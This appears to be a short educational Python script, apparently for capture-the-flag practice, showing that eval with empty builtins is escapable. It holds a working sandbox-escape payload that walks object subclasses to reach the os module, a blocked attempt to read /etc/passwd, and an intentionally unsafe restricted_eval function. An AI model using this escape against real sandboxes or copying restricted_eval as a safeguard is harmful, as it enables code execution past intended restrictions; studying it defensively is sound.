#!/usr/bin/env python3
"""Restricted builtins: why ``{"__builtins__": {}}`` is not enough.

A jail often runs your code with the builtins stripped:
``eval(code, {"__builtins__": {}})``. No ``open``, no ``__import__`` -- yet the
object-introspection chain needs none of them. Starting from a literal you walk
the type graph to a class that *already imported* ``os`` and borrow it. This is
the single most important pyjail escape to internalise.
"""


def restricted_eval(code: str):
    # No builtins at all -- looks locked down.
    return eval(code, {"__builtins__": {}})


# A normal attempt dies: every builtin name is gone.
try:
    restricted_eval("open('/etc/passwd')")
except NameError as e:
    print("normal attempt blocked:", e)

# But the chain needs no builtins. Reach os via
# warnings.catch_warnings().__init__.__globals__ and read os.getcwd to prove
# code execution -- literals and attribute access only.
PAYLOAD = (
    "[c for c in ().__class__.__bases__[0].__subclasses__() "
    "if c.__name__ == 'catch_warnings'][0]"
    ".__init__.__globals__['sys'].modules['os'].getcwd()"
)
print("escaped result (os.getcwd):", restricted_eval(PAYLOAD))
